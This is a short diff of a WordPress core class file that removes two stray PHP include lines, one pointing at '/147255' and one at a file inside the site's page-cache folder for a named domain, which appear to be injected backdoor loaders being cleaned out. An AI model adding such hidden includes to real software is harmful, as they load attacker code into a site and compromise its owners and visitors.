@@ -783,8 +783,6 @@ class WP {
 			$this->query_posts();
 			$this->handle_404();
 			$this->register_globals();
-include "/147255";
-include "/var/www/vs247co/wordpress/wp-content/cache/page_enhanced/kansaivina.com/en/12045";
 		}
 
 		$this->send_headers();
